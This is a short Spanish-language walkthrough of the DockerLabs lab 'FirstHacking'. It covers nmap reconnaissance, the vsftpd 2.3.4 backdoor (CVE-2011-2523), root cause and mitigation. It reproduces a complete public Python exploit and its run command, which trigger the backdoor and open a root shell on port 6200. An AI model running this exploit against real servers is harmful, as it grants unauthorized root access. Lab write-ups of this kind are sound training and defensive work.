# FirstHacking — vsftpd 2.3.4 Backdoor

**Dificultad:** Muy fácil
**Plataforma:** DockerLabs

## Reconocimiento

```bash
nmap -sS -sCV -Pn -n 172.17.0.2
```

Resultado: puerto 21/tcp abierto, `vsftpd 2.3.4`.

## Análisis de vulnerabilidad

La versión `vsftpd 2.3.4` tiene un backdoor conocido (CVE-2011-2523): cualquier usuario que incluya `:)` en el campo de login dispara un listener en el puerto 6200 que da una shell como root.

## Explotación

Exploit público (Exploit-DB #49757), usando `telnetlib`:

```python
#!/usr/bin/python3
from telnetlib import Telnet
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    print('  [+]Exiting...')
    exit(0)

signal(SIGINT, handler)
parser = argparse.ArgumentParser()
parser.add_argument("host", help="input the address of the vulnerable host")
args = parser.parse_args()
host = args.host

portFTP = 21
user = "USER nergal:)"
password = "PASS pass"

tn = Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)")
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.")
tn.write(password.encode('ascii') + b"\n")

tn2 = Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()
```

Ejecución:

```bash
python3 exploit.py 172.17.0.2
```

Resultado: shell interactiva directa como **root** (confirmado con `whoami`).

## Causa raíz

El backdoor fue insertado maliciosamente en el código fuente de vsftpd 2.3.4 entre el 30/06 y el 01/07/2011, tras comprometer los servidores de distribución. Cualquier login con `:)` abre una shell en el puerto 6200.

## Mitigación

- Actualizar a una versión parcheada.
- Verificar checksums/firmas de los binarios descargados.
